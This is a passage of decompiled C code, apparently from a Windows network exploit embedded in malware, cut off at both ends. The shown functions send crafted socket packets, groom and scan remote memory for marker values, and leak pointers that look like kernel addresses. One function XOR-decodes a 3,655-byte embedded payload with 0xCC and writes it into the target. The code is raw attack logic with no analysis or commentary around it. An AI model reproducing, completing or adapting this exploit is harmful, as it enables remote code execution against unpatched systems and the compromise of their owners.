		goto LABEL_16;
	}
	v16 = 0;
	v20 = SockSendBuffer(s, v10, v15) ? -1 : SockreceivData(&v16, s, 7, v18);
	GetAndFreeHeap(&v18);
	GetAndFreeHeap(&v21);
	if (v20)
	{
	LABEL_16:
		GetAndFreeHeap(&Src);
		return -1;
	}
	GetAndFreeHeap(&Src);
	v11 = CreateHeap(0x200u);
	Src = v11;
	if (!v11)
		return -1;
	v12 = sub_681F3863(0x200u, s, a4, a5, *v8, a6, a7, a7, 12, v11);
	GetAndFreeHeap(&Src);
	if (v12)
		return -1;
	v13 = (dword_6820FB08 + dword_6820FB18 - 512);
	if (v13 > 0xFE80u || sub_681F4820(2, s, a4, a5, *v8, a6, a7, 0, 0, v13))
		return -1;
	v18 = 0;
	Src = CreateHeap(0x10u);
	v14 = sub_681F3986(0x10u, s, a4, a5, *v8, a6, 0, 1, 0xFFFF, Src, &v18, &a7, 1);
	GetAndFreeHeap(&Src);
	GetAndFreeHeap(&v18);
	return (v14 == 65538) - 1;
}
// 6820FB08: using guessed type int dword_6820FB08;
// 6820FB18: using guessed type int dword_6820FB18;

//----- (681F4AFE) --------------------------------------------------------
int __stdcall sub_681F4AFE(SOCKET s, int a2, int a3, int a4, int a5, int a6, int a7, void *Src, int a9, int a10, int a11, int a12)
{
	int v12; // ebx
	int v13; // esi
	int v14; // edi

	v12 = a11;
	v13 = a10;
	v14 = a9;
	if (qword_6820FAF0 != __PAIR__(a11, a10))
	{
		if ((dword_6820FB08 + dword_6820FB24 - 512) > 0xFE80u
			|| sub_681F4820(a7, s, a2, a3, a4, a5, a6, a10, a11, (dword_6820FB08 + dword_6820FB24 - 512)))
		{
			return -1;
		}
		LODWORD(qword_6820FAF0) = v13;
		HIDWORD(qword_6820FAF0) = v12;
	}
	return sub_681F3986(v14, s, a2, a3, a4, a5, 0, (v14 - 15), a12, Src, &Src, &a9, 0);
}
// 6820FAF0: using guessed type __int64 qword_6820FAF0;
// 6820FB08: using guessed type int dword_6820FB08;
// 6820FB24: using guessed type int dword_6820FB24;

//----- (681F4BA1) --------------------------------------------------------
int __stdcall sub_681F4BA1(SOCKET s, int a2, int a3, int a4, int a5, int a6)
{
	__int64 v6; // kr00_8
	char *v7; // eax
	int v9; // ST18_4
	int v10; // edi
	char *v11; // [esp+8h] [ebp-8h]
	int v12; // [esp+Ch] [ebp-4h]

	v12 = 4;
	if (byte_6820F8FC)
		v12 = 8;
	v6 = qword_6820FAD0 + 4;
	v7 = CreateHeap(0x13u);
	v11 = v7;
	if (!v7)
		return -1;
	v9 = v12;
	*(v7 + 15) = 4096;
	v10 = sub_681F4AFE(s, a2, a3, a4, a5, a6, v9, v7, 19, v6, SHIDWORD(v6), 0);
	GetAndFreeHeap(&v11);
	return v10;
}
// 6820F8FC: using guessed type char byte_6820F8FC;
// 6820FAD0: using guessed type __int64 qword_6820FAD0;

//----- (681F4C1C) --------------------------------------------------------
signed int  sub_681F4C1C(int a1, SOCKET s, int a3, int a4, int a5, int a6, int a7, int a8, __int64 a9, unsigned __int16 a10, _DWORD *a11, _WORD *a12)
{
	int v12; // edi
	SIZE_T v13; // esi
	char *v14; // eax
	signed int result; // eax
	int v16; // ecx
	SIZE_T v17; // esi
	char *v18; // ecx
	_BYTE *v19; // eax
	int v20; // ST30_4
	char *v21; // eax
	_BYTE *v22; // esi
	int *v23; // esi
	int v24; // ST30_4
	_BYTE *v25; // eax
	int v26; // edi
	_BYTE *v27; // eax
	int v28; // edi
	int v29; // esi
	SIZE_T v30; // eax
	void *v31; // eax
	signed int v32; // edi
	int v33; // [esp+Ch] [ebp-14h]
	int v34; // [esp+10h] [ebp-10h]
	int v35; // [esp+14h] [ebp-Ch]
	int v36; // [esp+18h] [ebp-8h]
	_BYTE *v37; // [esp+1Ch] [ebp-4h]
	int v38; // [esp+4Ch] [ebp+2Ch]
	int v39; // [esp+4Ch] [ebp+2Ch]
	int v40; // [esp+4Ch] [ebp+2Ch]
	int v41; // [esp+4Ch] [ebp+2Ch]
	int v42; // [esp+4Ch] [ebp+2Ch]

	v12 = a1;
	v33 = 0;
	v35 = 0;
	v36 = 4;
	v34 = 0;
	if (byte_6820F8FC)
	{
		v36 = 8;
		v34 = 4;
	}
	v13 = (v36 + 47);
	v14 = CreateHeap(v13);
	v37 = v14;
	if (!v14)
		return -1;
	*(v14 + 15) = a7;
	*(v14 + 19) = a8;
	v16 = v34;
	*&v14[v16 + 19] = 4;
	*&v14[v16 + 34] = 4096;
	*&v14[v16 + 47] = a10;
	v38 = sub_681F4AFE(s, a3, a4, a5, a6, v12, v36, v14, v13, a9, SHIDWORD(a9), dword_6820FB14);
	GetAndFreeHeap(&v37);
	result = -1;
	if (v38 == -1)
		return result;
	if (!dword_6820FB40)
	{
		v17 = (v36 + 15);
		v18 = CreateHeap(v17);
		v37 = v18;
		if (!v18)
			return -1;
		if (byte_6820F8FC)
			*(v18 + 15) = a9 + word_6820FB20;
		else
			*(v18 + 15) = a9 + word_6820FB20;
		v39 = sub_681F4AFE(s, a3, a4, a5, a6, v12, v36, v18, v17, a9, SHIDWORD(a9), dword_6820FB10);
		GetAndFreeHeap(&v37);
		result = -1;
		if (v39 == -1)
			return result;
		dword_6820FB40 = 1;
		v19 = CreateHeap(0x10u);
		v37 = v19;
		if (!v19)
			return -1;
		v20 = word_6820FB34;
		v19[15] = 1;
		v40 = sub_681F4AFE(s, a3, a4, a5, a6, v12, 1, v19, 16, a9, SHIDWORD(a9), v20);
		GetAndFreeHeap(&v37);
		if (v40 == -1)
			return -1;
	}
	v21 = CreateHeap(0x13u);
	v37 = v21;
	if (!v21)
		return -1;
	*(v21 + 17) = v12;
	*(v21 + 15) = 35;
	v41 = sub_681F4AFE(s, a3, a4, a5, a6, v12, 4, v21, 19, a9, SHIDWORD(a9), word_6820FB20);
	GetAndFreeHeap(&v37);
	result = -1;
	if (v41 == -1)
		return result;
	if (dword_6820FB3C)
	{
		v22 = CreateHeap(0x10u);
		v37 = v22;
		if (v22)
		{
			if (sub_681F4AFE(s, a3, a4, a5, a6, v12, 1, v22, 16, a9, SHIDWORD(a9), dword_6820FB1C) == -1)
			{
				v23 = &v37;
			LABEL_21:
				GetAndFreeHeap(v23);
				return -1;
			}
			v24 = word_6820FB2C;
			v22[15] = 2;
			v42 = sub_681F4AFE(s, a3, a4, a5, a6, v12, 1, v22, 16, a9, SHIDWORD(a9), v24);
			GetAndFreeHeap(&v37);
			if (v42 == -1)
				return -1;
			goto LABEL_23;
		}
		return -1;
	}
LABEL_23:
	if (dword_6820FB38)
	{
		v25 = CreateHeap(0x10u);
		v37 = v25;
		if (!v25)
			return -1;
		v26 = sub_681F4AFE(s, a3, a4, a5, a6, v12, 1, v25, 16, a9, SHIDWORD(a9), word_6820FB30);
		GetAndFreeHeap(&v37);
		result = -1;
		if (v26 == -1)
			return result;
		dword_6820FB38 = 0;
	}
	dword_6820FB3C = 1;
	v27 = CreateHeap(0xFu);
	v37 = v27;
	if (!v27)
		return -1;
	v28 = sub_681F3986(0xFu, s, a3, a4, a5, a6, word_6820FB44, 0, 0, v27, &v35, &v33, 1);
	GetAndFreeHeap(&v37);
	if (v28 != -2147483643)
		goto LABEL_38;
	v29 = v35;
	if (!v35)
		return -1;
	v30 = *(v35 + 49);
	*a12 = v30;
	if (v30 >= v33)
	{
	LABEL_38:
		v23 = &v35;
		goto LABEL_21;
	}
	v31 = CreateHeap(v30);
	*a11 = v31;
	if (v31)
	{
		memcpy(v31, (*(v29 + 51) + v29 + 4), *a12);
		v32 = 0;
	}
	else
	{
		v32 = -1;
	}
	GetAndFreeHeap(&v35);
	return v32;
}
// 6820F8FC: using guessed type char byte_6820F8FC;
// 6820FB10: using guessed type int dword_6820FB10;
// 6820FB14: using guessed type int dword_6820FB14;
// 6820FB1C: using guessed type int dword_6820FB1C;
// 6820FB20: using guessed type __int16 word_6820FB20;
// 6820FB2C: using guessed type __int16 word_6820FB2C;
// 6820FB30: using guessed type __int16 word_6820FB30;
// 6820FB34: using guessed type __int16 word_6820FB34;
// 6820FB38: using guessed type int dword_6820FB38;
// 6820FB3C: using guessed type int dword_6820FB3C;
// 6820FB40: using guessed type int dword_6820FB40;
// 6820FB44: using guessed type __int16 word_6820FB44;

//----- (681F4FB3) --------------------------------------------------------
signed int  sub_681F4FB3(int a1, int a2, __int64 a3)
{
	int v3; // eax
	int v4; // ebx
	__int64 v5; // kr00_8
	signed int result; // eax

	v3 = a2 + a1;
	if (*(a2 + a1 + 112) != *(a2 + a1 + 120))
		goto LABEL_8;
	if (*(v3 + 116) != *(v3 + 124))
		goto LABEL_8;
	v4 = 0;
	if (*v3 - a3 > 0x100000)
		goto LABEL_8;
	while (1)
	{
		a1 += 8;
		if (++v4 >= 0x12)
			break;
		v5 = *(a2 + a1) - a3;
		if (v5 >= 0 && (*(a2 + a1 + 4) >= (*(a2 + a1) < a3) + HIDWORD(a3) && HIDWORD(v5) != 0 || v5 > 0x100000))
			goto LABEL_8;
	}
	if (*(a2 + a1))
		LABEL_8:
	result = 0;
	else
		result = 1;
	return result;
}

//----- (681F501B) --------------------------------------------------------
signed int  sub_681F501B(int a1, int a2, __int64 a3)
{
	int v3; // esi
	signed int v4; // ecx
	unsigned int v5; // edi
	int v6; // eax
	signed int v7; // eax
	unsigned int v8; // ecx
	unsigned int v10; // [esp+Ch] [ebp-Ch]
	int v11; // [esp+10h] [ebp-8h]
	unsigned int v12; // [esp+14h] [ebp-4h]

	v12 = 0;
	v3 = a2;
	v4 = 76;
	if (byte_6820F8FC)
		v4 = 152;
	v5 = 16 - (a3 & 0xF);
	v10 = a1 - v4;
	if (v5 >= a1 - v4)
		return -1;
	while (1)
	{
		v6 = *(v5 + v3);
		if (v6 != -16843010)
			break;
		++v12;
	LABEL_16:
		v5 += 4;
		if (v5 >= v10)
			return -1;
	}
	if (v12 < 0x24)
		goto LABEL_16;
	if (byte_6820F8FC)
	{
		v7 = sub_681F4FB3(v5, v3, a3);
	}
	else
	{
		v8 = v5;
		if (*(v5 + v3 + 56) == *(v5 + v3 + 60))
		{
			v11 = 0;
			while ((v6 - a3) <= 0x100000)
			{
				v8 += 4;
				if (++v11 >= 0x12)
				{
					v7 = *(v8 + v3) == 0;
					goto LABEL_15;
				}
				v6 = *(v8 + v3);
			}
		}
		v7 = 0;
	}
LABEL_15:
	if (!v7)
		goto LABEL_16;
	qword_6820FAE0 = a3 + v5;
	return 0;
}
// 6820F8FC: using guessed type char byte_6820F8FC;
// 6820FAE0: using guessed type __int64 qword_6820FAE0;

//----- (681F50E0) --------------------------------------------------------
signed int __stdcall sub_681F50E0(SOCKET a1, int a2, int a3, int a4, int a5, int a6, __int64 a7, unsigned __int16 a8)
{
	signed int v8; // ebx
	unsigned int v9; // esi
	char *v10; // edi
	BOOL *v12; // esi
	__int64 v13; // [esp+Ch] [ebp-20h]
	unsigned int v14; // [esp+18h] [ebp-14h]
	unsigned int v15; // [esp+1Ch] [ebp-10h]
	int v16; // [esp+20h] [ebp-Ch]
	char *v17; // [esp+24h] [ebp-8h]
	void *Src; // [esp+28h] [ebp-4h]
	int v19; // [esp+54h] [ebp+28h]

	v8 = 1024;
	v9 = 0;
	v15 = a8;
	v10 = CreateHeap(a8);
	v17 = v10;
	if (v10)
	{
		Src = 0;
		v16 = 0;
		v19 = a8;
		v13 = a7;
		while (1)
		{
			if (!v19)
			{
			LABEL_13:
				v12 = &v17;
				goto LABEL_14;
			}
			if (v8 > v19)
				v8 = v19;
			if (sub_681F4C1C(a6, a1, a2, a3, a4, a5, v13, SHIDWORD(v13), *&qword_6820FAE8, v8, &Src, &v16) == -1)
				break;
			if (!Src)
				goto LABEL_13;
			v14 = v16 + v9;
			if (v14 >= v15)
				break;
			memcpy(&v10[v9], Src, v16);
			GetAndFreeHeap(&Src);
			v9 = v14;
			v13 += v8;
			v19 -= v8;
			if (!sub_681F501B(v14, v10, a7))
			{
				GetAndFreeHeap(&v17);
				return 0;
			}
		}
		GetAndFreeHeap(&v17);
		v12 = &Src;
	LABEL_14:
		GetAndFreeHeap(v12);
	}
	return -1;
}

//----- (681F51F3) --------------------------------------------------------
signed int  sub_681F51F3(int a1, SOCKET a2, int a3, int a4, int a5, int a6)
{
	unsigned __int16 v6; // ax
	signed int result; // eax
	unsigned int v8; // eax
	signed int v9; // eax
	int v10; // [esp+Ch] [ebp-8h]
	_DWORD *v11; // [esp+10h] [ebp-4h]

	v11 = 0;
	v10 = 0;
	v6 = 40;
	if (byte_6820F8FC)
		v6 = 64;
	if (sub_681F4C1C(a1, a2, a3, a4, a5, a6, dword_6820FAD8, dword_6820FADC, *&qword_6820FAE8, v6, &v11, &v10) == -1)
		goto LABEL_4;
	if (byte_6820F8FC)
	{
		v8 = v11[15];
		LODWORD(qword_6820FB00) = v11[14];
		HIDWORD(qword_6820FB00) = v8;
		if (!Dummy_StackSettup(__PAIR__(v8, qword_6820FB00)))
			goto LABEL_4;
	}
	else
	{
		LODWORD(qword_6820FB00) = v11[9];
		qword_6820FB00 = qword_6820FB00;
		if (qword_6820FB00 < 0x80000000)
		{
		LABEL_4:
			GetAndFreeHeap(&v11);
			return -1;
		}
	}
	GetAndFreeHeap(&v11);
	if (byte_6820F8FC)
		v9 = sub_681F50E0(a2, a3, a4, a5, a6, a1, qword_6820FB00 - 4096, 0x1000u);
	else
		v9 = sub_681F50E0(a2, a3, a4, a5, a6, a1, qword_6820FB00 - 2816, 0x1000u);
	if (v9)
		result = sub_681F50E0(a2, a3, a4, a5, a6, a1, qword_6820FB00 - 6144, 0x2800u);
	else
		result = 0;
	return result;
}
// 6820F8FC: using guessed type char byte_6820F8FC;
// 6820FAD8: using guessed type int dword_6820FAD8;
// 6820FADC: using guessed type int dword_6820FADC;
// 6820FB00: using guessed type __int64 qword_6820FB00;

//----- (681F5333) --------------------------------------------------------
signed int  sub_681F5333(int a1, SOCKET s, int a3, int a4, int a5, int a6, int a7, void *Src)
{
	_BYTE *v8; // eax
	bool v9; // zf
	__int16 v10; // cx
	int v11; // edx
	int v12; // edi
	char *v13; // esi
	int v14; // ecx
	_BYTE *v15; // eax
	int v16; // ST30_4
	int v17; // ST2C_4
	char *v18; // eax
	_BYTE *v19; // esi
	BOOL *v20; // esi
	signed int result; // eax
	int v22; // ST30_4
	int v23; // ST2C_4
	void *v24; // eax
	int v25; // esi
	void *v26; // eax
	int v27; // edi
	int v28; // edi
	unsigned int v29; // eax
	unsigned int v30; // eax
	__int64 v31; // kr00_8
	char *v32; // eax
	_BYTE *v33; // ecx
	char v34; // dl
	_BYTE *v35; // ecx
	char v36; // dl
	signed int v37; // edi
	int v38; // eax
	int v39; // edx
	int v40; // esi
	signed int v41; // eax
	int v42; // edi
	void *v43; // eax
	__int64 v44; // [esp+Ch] [ebp-20h]
	int v45; // [esp+18h] [ebp-14h]
	int v46; // [esp+20h] [ebp-Ch]
	int v47; // [esp+24h] [ebp-8h]
	int v48; // [esp+28h] [ebp-4h]

	v46 = 0;
	if (SockProcessSendRecv(s, a3, a4, a5, a1, a6, &v46, Src) == -1)
		return -1;
	v8 = CreateHeap(0x2Fu);
	Src = v8;
	if (!v8)
		return -1;
	v9 = byte_6820F8FC == 0;
	v10 = dword_6820FB14;
	v8[15] = 4;
	v8[31] = 16;
	v8[44] = 1;
	v11 = (v10 + 4);
	if (!v9)
		v11 = (v10 + 8);
	v12 = v46;
	v48 = sub_681F4AFE(s, a3, a4, a5, a1, v46, 32, v8, 47, qword_6820FAE8, *(&qword_6820FAE8 + 1), v11);
	GetAndFreeHeap(&Src);
	if (v48 == -1)
		return -1;
	if (!dword_6820FB40)
	{
		v47 = 4 * (byte_6820F8FC != 0) + 4;
		v45 = (4 * (byte_6820F8FC != 0) + 19);
		v13 = CreateHeap(v45);
		Src = v13;
		if (!v13)
			return -1;
		v14 = *(&qword_6820FAE8 + 1);
		if (byte_6820F8FC)
			*(v13 + 15) = *&qword_6820FAE8 + word_6820FB20;
		else
			*(v13 + 15) = qword_6820FAE8 + word_6820FB20;
		v48 = sub_681F4AFE(s, a3, a4, a5, a1, v12, v47, v13, v45, qword_6820FAE8, v14, dword_6820FB10);
		GetAndFreeHeap(&Src);
		if (v48 == -1)
			return -1;
		dword_6820FB40 = 1;
		v15 = CreateHeap(0x10u);
		Src = v15;
		if (!v15)
			return -1;
		v16 = word_6820FB34;
		v17 = *(&qword_6820FAE8 + 1);
		v15[15] = 1;
		v48 = sub_681F4AFE(s, a3, a4, a5, a1, v12, 1, v15, 16, qword_6820FAE8, v17, v16);
		GetAndFreeHeap(&Src);
		if (v48 == -1)
			return -1;
	}
	v18 = CreateHeap(0x13u);
	Src = v18;
	if (!v18)
		return -1;
	*(v18 + 17) = v12;
	*(v18 + 15) = 54;
	v48 = sub_681F4AFE(s, a3, a4, a5, a1, v12, 4, v18, 19, qword_6820FAE8, *(&qword_6820FAE8 + 1), word_6820FB20);
	GetAndFreeHeap(&Src);
	if (v48 == -1)
		return -1;
	if (dword_6820FB3C)
	{
		v19 = CreateHeap(0x10u);
		Src = v19;
		if (!v19)
			return -1;
		if (sub_681F4AFE(s, a3, a4, a5, a1, v12, 1, v19, 16, qword_6820FAE8, *(&qword_6820FAE8 + 1), dword_6820FB1C) == -1)
		{
			v20 = &Src;
		LABEL_20:
			GetAndFreeHeap(v20);
			return -1;
		}
		v22 = word_6820FB2C;
		v23 = *(&qword_6820FAE8 + 1);
		v19[15] = 2;
		v48 = sub_681F4AFE(s, a3, a4, a5, a1, v12, 1, v19, 16, qword_6820FAE8, v23, v22);
		GetAndFreeHeap(&Src);
		if (v48 == -1)
			return -1;
	}
	if (dword_6820FB38)
	{
		v24 = CreateHeap(0x10u);
		Src = v24;
		if (!v24)
			return -1;
		v48 = sub_681F4AFE(s, a3, a4, a5, a1, v12, 1, v24, 16, qword_6820FAE8, *(&qword_6820FAE8 + 1), word_6820FB30);
		GetAndFreeHeap(&Src);
		if (v48 == -1)
			return -1;
		dword_6820FB38 = 0;
	}
	v47 = 4 * (byte_6820F8FC != 0) + 4;
	v25 = (4 * (byte_6820F8FC != 0) + 19);
	v26 = CreateHeap(v25);
	Src = v26;
	if (!v26)
		return -1;
	v27 = sub_681F4AFE(s, a3, a4, a5, a1, v12, v47, v26, v25, qword_6820FAE8, *(&qword_6820FAE8 + 1), word_6820FB28);
	GetAndFreeHeap(&Src);
	if (v27 == -1)
		return -1;
	dword_6820FB3C = 1;
	Src = CreateHeap(0xFu);
	if (!Src)
		return -1;
	v46 = 0;
	v48 = 0;
	v28 = sub_681F3986(0xFu, s, a3, a4, a5, a1, word_6820FB44, 0, 0, Src, &v48, &v46, 0);
	GetAndFreeHeap(&Src);
	if (v28 == -1)
		return -1;
	if (sub_681F4C1C(
		a7,
		s,
		a3,
		a4,
		a5,
		a1,
		qword_6820FAE8 + word_6820FB28,
		(*&qword_6820FAE8 + word_6820FB28) >> 32,
		*&qword_6820FAE8,
		v47,
		&v48,
		&v46) == -1)
	{
	LABEL_32:
		v20 = &v48;
		goto LABEL_20;
	}
	if (byte_6820F8FC)
	{
		if (v46 < 8u)
			goto LABEL_32;
		v29 = *(v48 + 4);
		LODWORD(qword_6820FAF8) = *v48;
		HIDWORD(qword_6820FAF8) = v29;
		if (!Dummy_StackSettup(__PAIR__(v29, qword_6820FAF8)))
			goto LABEL_32;
	}
	else
	{
		if (v46 < 4u)
			goto LABEL_32;
		v30 = *v48;
		qword_6820FAF8 = *v48;
		if (v30 < 0x80000000)
			goto LABEL_32;
	}
	GetAndFreeHeap(&v48);
	v31 = qword_6820FAF8 + 256;
	v44 = qword_6820FAF8 + 256;
	v45 = (2 * (byte_6820F8FC == 0) + 3676);
	v32 = CreateHeap(v45);
	v46 = v32;
	if (!v32)
		return -1;
	if (byte_6820F8FC)
	{
		*(v32 + 15) = 488;
		v32[20] = -61;
		Src = byte_682031A8;
		v33 = v32 + 21;
		v47 = 3655;
		do
		{
			v34 = *Src ^ 0xCC;
			Src = Src + 1;
			*v33++ = v34;
			--v47;
		} while (v47);
	}
	else
	{
		*(v32 + 15) = 1000;
		*(v32 + 10) = 1218;
		Src = byte_682031A8;
		v35 = v32 + 23;
		v47 = 3655;
		do
		{
			v36 = *Src ^ 0xCC;
			Src = Src + 1;
			*v35++ = v36;
			--v47;
		} while (v47);
	}
	if (byte_6820F8FC)
	{
		v48 = 8;
		HIBYTE(Src) = 112;
	}
	else
	{
		v48 = 4;
		HIBYTE(Src) = 56;
	}
	v37 = sub_681F4AFE(s, a3, a4, a5, a1, a7, v48, v32, v45, v31, SHIDWORD(v31), 0);
	GetAndFreeHeap(&v46);
	if (v37 == -1)
		return -1;
	if (qword_6820FAF0 != v44)
	{
		v38 = (dword_6820FB08 + dword_6820FB24 - 512);
		if (v38 <= 0xFE80u)
			v37 = sub_681F4820(v48, s, a3, a4, a5, a1, a7, v44, SHIDWORD(v44), v38);
		else
			v37 = -1;
		qword_6820FAF0 = v44;
	}
	if (v37 == -1)
		return -1;
	v39 = (qword_6820FAE0 + HIBYTE(Src)) >> 32;
	v40 = qword_6820FAE0 + HIBYTE(Src);
	v46 = (qword_6820FAE0 + HIBYTE(Src)) >> 32;
	if (qword_6820FAF0 != qword_6820FAE0 + HIBYTE(Src))
	{
		if ((dword_6820FB08 + dword_6820FB24 - 512) <= 0xFE80u)
		{
			v41 = sub_681F4820(v48, s, a3, a4, a5, a1, a7, v40, v39, (dword_6820FB08 + dword_6820FB24 - 512));
			v39 = v46;
			v37 = v41;
		}
		else
		{
			v37 = -1;
		}
		LODWORD(qword_6820FAF0) = v40;
		HIDWORD(qword_6820FAF0) = v39;
	}
	result = -1;
	if (v37 != -1)
	{
		dword_6820FB08 = 512;
		v42 = -1;
		if (sub_681F4820(v48, s, a3, a4, a5, a1, 0, v44, SHIDWORD(v44), 0) != -1)
		{
			a5 = CreateHeap(0xCu);
			if (a5)
			{
				a3 = 0;
				v43 = CreateHeap(0xDu);
				v46 = v43;
				if (v43)
				{
					v42 = sub_681F330E(s, 0, a4, 65279, a1, a6, 240, a5, v43, 13, &a3, &v46, &v45);
					GetAndFreeHeap(&a5);
					GetAndFreeHeap(&v46);
				}
			}
		}
		result = v42;
	}
	return result;
}
// 6820F8FC: using guessed type char byte_6820F8FC;
// 6820FAE0: using guessed type __int64 qword_6820FAE0;
// 6820FAF0: using guessed type __int64 qword_6820FAF0;
// 6820FAF8: using guessed type __int64 qword_6820FAF8;
// 6820FB08: using guessed type int dword_6820FB08;
// 6820FB10: using guessed type int dword_6820FB10;
// 6820FB14: using guessed type int dword_6820FB14;
// 6820FB1C: using guessed type int dword_6820FB1C;
// 6820FB20: using guessed type __int16 word_6820FB20;
// 6820FB24: using guessed type int dword_6820FB24;
// 6820FB28: using guessed type __int16 word_6820FB28;
// 6820FB2C: using guessed type __int16 word_6820FB2C;
// 6820FB30: using guessed type __int16 word_6820FB30;
// 6820FB34: using guessed type __int16 word_6820FB34;
// 6820FB38: using guessed type int dword_6820FB38;
// 6820FB3C: using guessed type int dword_6820FB3C;
// 6820FB40: using guessed type int dword_6820FB40;
// 6820FB44: using guessed type __int16 word_6820FB44;

//----- (681F5A46) --------------------------------------------------------
int __stdcall SocketUseSockets(int a1, SOCKET s, int a3, int a4, int a5, int a6, int a7)
{
	SocketUseSocket1(s, a3, a4, a5, a6, a7);
	SocketUseSocket2(s, a3, a4, a5, a6, a7);
	return a1;
}

//----- (681F5A7E) --------------------------------------------------------
int  sub_681F5A7E(__m64 a1, __m64 a2, int a3, char *cp, u_short hostshort, int a6, int a7, int a8, int a9, int a10, int a11, int a12)
{
	unsigned __int16 v12; // ax
	void *v13; // ebx
	_WORD *v14; // ST30_4
	void *v15; // ST28_4
	SOCKET *v16; // ebx
	SOCKET v17; // eax
	LPVOID v18; // eax
	unsigned __int16 v19; // ax
	int v20; // esi
	SOCKET v21; // ST1C_4
	int v22; // edi
	int v23; // ST30_4
	int v24; // edi
	SOCKET v25; // edi
	char *v26; // ebx
	int v27; // ebx
	void *v28; // ebx
	void *v29; // edi
	SOCKET *v30; // esi
	signed int v31; // eax
	signed int v32; // ebx
	int result; // eax
	int v34; // ecx
	char v35; // al
	char *v36; // ecx
	BYTE *v37; // esi
	size_t v38; // esi
	SIZE_T v39; // eax
	int v40; // eax
	void *v41; // eax
	size_t *v42; // eax
	SIZE_T v43; // esi
	BOOL *v44; // esi
	SOCKET v45; // [esp+4h] [ebp-60h]
	int v46; // [esp+8h] [ebp-5Ch]
	int v47; // [esp+Ch] [ebp-58h]
	void *v48; // [esp+10h] [ebp-54h]
	int v49; // [esp+14h] [ebp-50h]
	int v50; // [esp+18h] [ebp-4Ch]
	char v51; // [esp+2Fh] [ebp-35h]
	int v52; // [esp+30h] [ebp-34h]
	int v53; // [esp+34h] [ebp-30h]
	int v54; // [esp+38h] [ebp-2Ch]
	void *v55; // [esp+3Ch] [ebp-28h]
	int v56; // [esp+40h] [ebp-24h]
	int v57; // [esp+44h] [ebp-20h]
	int v58; // [esp+48h] [ebp-1Ch]
	SIZE_T dwBytes; // [esp+4Ch] [ebp-18h]
	size_t v60; // [esp+50h] [ebp-14h]
	void *Src; // [esp+54h] [ebp-10h]
	size_t Size; // [esp+58h] [ebp-Ch]
	int v63; // [esp+5Ch] [ebp-8h]
	int v64; // [esp+60h] [ebp-4h]

	while (1)
	{
		v51 = 0;
		if (SocketCreateAndConnect(&v51, &a3, cp, hostshort))
			return -1;
		v12 = CheckIfTimePassed();
		v13 = v12;
		v56 = v12;
		v55 = 65279;
		v54 = 0;
		v52 = 0;
		v14 = CheckIfTimePassed();
		v15 = v13;
		v16 = a3;
		v53 = v14;
		v17 = *a3;
		dwBytes = 0;
		v57 = 0;
		v60 = 0;
		Src = 0;
		if (SockSendRecvDataFreeHeap(v17, 49159, v15, 65279, v14)
			|| SockProcessSendRecv_2(*v16, 49159, v56, 65279, &v52, v53, 0xD, 0, 0, &v57, &v60))
		{
			return -1;
		}
		if (!v57 || (LOBYTE(v58) = Unk_SockChecks(v57, v60), GetAndFreeHeap(&v57), v58 == -1))
		{
			SocketUseSocket2(*v16, v56, 0, 65279, v52, v53);
		LABEL_100:
			SockCloseConnection(v16);
			return -1;
		}
		if (sub_681F3061(*v16, v56, &v54, 0xFEFF, v52, v53))
		{
			SocketUseSocket2(*v16, v56, v54, 65279, v52, v53);
			goto LABEL_100;
		}
		v18 = CreateHeap(0xCu);
		v64 = v18;
		if (!v18)
			return -1;
		Size = sub_681F330E(*v16, v56, v54, 65279, v52, v53 + 1, 240, v18, 0, 0, &Src, &v57, &v60);
		GetAndFreeHeap(&v64);
		if (Size == -1 || !v57)
			goto LABEL_127;
		if (*(v57 + 26) == 17)
			break;
		GetAndFreeHeap(&v57);
		if (sub_681F35FA(*v16, 0xFFFF, 10241, v56, v54, 65279, v52, v53, 2, 255, 0) != -1073741307)
			goto LABEL_127;
		if (!a6)
			goto LABEL_124;
		if (byte_6820F8FD >= 3u)
			goto LABEL_127;
		++byte_6820F8FD;
		if (v58 != 2 && v58 != 3 && v58 != 4)
			goto LABEL_25;
		LOBYTE(v63) = 0;
		if (SocketProcessSocket_1(&v63, *v16, v56, v54, 65279, v52, v53, &dwBytes))
			goto LABEL_127;
		v19 = rand();
		v20 = v54;
		v21 = *v16;
		v55 = v19;
		if (SocketProcessSocket_2(&v53, v21, v56, v54, v19, v52, dwBytes))
		{
		LABEL_133:
			v50 = v53;
			v49 = v52;
		LABEL_134:
			v48 = v55;
			v47 = v20;
			goto LABEL_129;
		}
		v22 = v52;
		if (sub_681F42DF(*v16, v56, v20, v55, v52, &v53, dwBytes)
			|| sub_681F489C(&v53, &v55, *v16, v56, v20, v22, dwBytes)
			|| sub_681F4BA1(*v16, v56, v20, v55, v22, dwBytes))
		{
			v50 = v53;
			v49 = v22;
			goto LABEL_134;
		}
		v23 = v22;
		v24 = dwBytes;
		if (sub_681F51F3(dwBytes, *v16, v56, v20, v55, v23))
			goto LABEL_133;
		if (sub_681F5333(v52, *v16, v56, v20, v55, v53, v24, v63))
			goto LABEL_136;
		v16 = a3;
	LABEL_25:
		if (v58 == 5 || v58 == 6 || v58 == 7)
		{
			v25 = *v16;
			Size = 0;
			dwBytes = sub_681F2547(&Size, v56, v54, v55, v52, v53);
			if (dwBytes)
			{
				Src = CreateHeap(0x1000u);
				if (Src)
				{
					v64 = 0;
					if (SockSendBuffer(v25, dwBytes, Size) || (v26 = Src, SockreceivData(&v64, v25, 1, Src)))
					{
						GetAndFreeHeap(&Src);
						GetAndFreeHeap(&dwBytes);
					}
					else
					{
						v27 = *(v26 + 9);
						GetAndFreeHeap(&Src);
						GetAndFreeHeap(&dwBytes);
						if (!v27 && !sub_681F3B5D(v25, v56, v54, v55, v52, v53))
						{
							Sleep(0x456u);
							if (SocketCreateAndConnect(&v51, &a3, cp, hostshort))
							{
							LABEL_136:
								v50 = v53;
								v49 = v52;
								v48 = v55;
								v47 = v54;
								v46 = v56;
								v45 = *a3;
								goto LABEL_130;
							}
							v28 = v53;
							v29 = v56;
							v30 = a3;
							if (!SockSendRecvDataFreeHeap(*(a3 + 4), 49235, v56, v55, v53))
							{
								Size = 0;
								if (!SockProcessSendRecv_2(v30[1], 49159, v29, v55, &Size, v28, 0xC, 301, 0xFFF0, &v57, &v60))
								{
									if (SocketCreateAndConnect(&v51, &a3, cp, hostshort)
										|| SocketCreateAndConnect(&v51, &a3, cp, hostshort)
										|| sub_681F3CA0(0, v30[2])
										|| SocketCreateAndConnect(&v51, &a3, cp, hostshort)
										|| sub_681F3CA0(0, v30[3])
										|| sub_681F3CA0(0, v30[4])
										|| SocketCreateAndConnect(&v51, &a3, cp, hostshort)
										|| sub_681F3CA0(0, v30[5])
